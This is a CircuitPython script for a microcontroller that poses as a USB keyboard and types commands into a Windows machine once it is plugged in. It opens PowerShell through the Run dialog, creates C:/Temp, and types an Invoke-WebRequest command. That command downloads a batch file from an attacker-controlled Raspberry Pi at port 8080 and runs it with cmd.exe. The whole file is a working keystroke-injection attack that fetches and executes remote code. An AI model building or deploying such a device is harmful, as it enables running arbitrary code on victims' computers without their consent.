import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode

keyboard = Keyboard(usb_hid.devices)

time.sleep(3)



#opemn cmdN
keyboard.send(Keycode.GUI, Keycode.R)
time.sleep(0.2)
for letter in [Keycode.P, Keycode.O, Keycode.W, Keycode.E, Keycode.R, Keycode.S, Keycode.H, Keycode.E, Keycode.L, Keycode.L]:
    keyboard.send(letter)
    time.sleep(0.1)

keyboard.send(Keycode.ENTER)
time.sleep(0.2)

make_dir = "New-Item -ItemType Directory -Path 'C:/Temp/' -Force"
time.sleep(0.3)

for letter in make_dir:
    if letter.isupper():
        keyboard.send(Keycode.SHIFT, getattr(Keycode, letter))
    elif letter == " ":
        keyboard.send(Keycode.SPACE)
    elif letter == ",":
        keyboard.send(Keycode.COMMA)
    elif letter == ".":
        keyboard.send(Keycode.PERIOD)
    elif letter == "/":
        keyboard.press(Keycode.BACKSLASH)
    elif letter == "-":
        keyboard.press(Keycode.KEYPAD_MINUS)
    elif letter == "'":
        keyboard.press(Keycode.QUOTE)
    elif letter == ":":
        keyboard.press(Keycode.SHIFT)
        keyboard.press(Keycode.SEMICOLON)
        keyboard.release(Keycode.SHIFT)
    else:
        keyboard.send(getattr(Keycode, letter.upper()))
    time.sleep(0.1)
keyboard.send(Keycode.ENTER)


command = r'Invoke-WebRequest -Uri "http://{IP from your rpi}:8080/testscript.bat" -OutFile "C:\Temp\testscript.bat"; Start-Process -FilePath "cmd.exe" -ArgumentList "/c C:\Temp\testscript.bat" -NoNewWindow -Wait'
time.sleep(0.3)

for letter in command:
    if letter.isupper():
        keyboard.send(Keycode.SHIFT, getattr(Keycode, letter))
    elif letter == " ":
        keyboard.send(Keycode.SPACE)
    elif letter == ",":
        keyboard.send(Keycode.COMMA)
    elif letter == ".":
        keyboard.send(Keycode.PERIOD)
    elif letter == "\\":
        keyboard.send(Keycode.BACKSLASH)
    elif letter == "/":
        keyboard.send(Keycode.FORWARD_SLASH)
    elif letter == "-":
        keyboard.send(Keycode.KEYPAD_MINUS)
    elif letter == '"':
        keyboard.press(Keycode.SHIFT)
        keyboard.press(Keycode.QUOTE)
        keyboard.release(Keycode.SHIFT)
    elif letter == "'":
        keyboard.send(Keycode.QUOTE)
    elif letter == ":":
        keyboard.press(Keycode.SHIFT)
        keyboard.press(Keycode.SEMICOLON)
        keyboard.release(Keycode.SHIFT)
    elif letter == ";":
        keyboard.send(Keycode.SEMICOLON)
    elif letter == "0":
        keyboard.send(Keycode.ZERO)
    elif letter == "1":
        keyboard.send(Keycode.ONE)
    elif letter == "2":
        keyboard.send(Keycode.TWO)
    elif letter == "3":
        keyboard.send(Keycode.THREE)
    elif letter == "4":
        keyboard.send(Keycode.FOUR)
    elif letter == "5":
        keyboard.send(Keycode.FIVE)
    elif letter == "6":
        keyboard.send(Keycode.SIX)
    elif letter == "7":
        keyboard.send(Keycode.SEVEN)
    elif letter == "8":
        keyboard.send(Keycode.EIGHT)
    elif letter == "9":
        keyboard.send(Keycode.NINE)
    else:
        keyboard.send(getattr(Keycode, letter.upper()))
    time.sleep(0.1)

time.sleep(0.2)
keyboard.send(Keycode.ENTER)
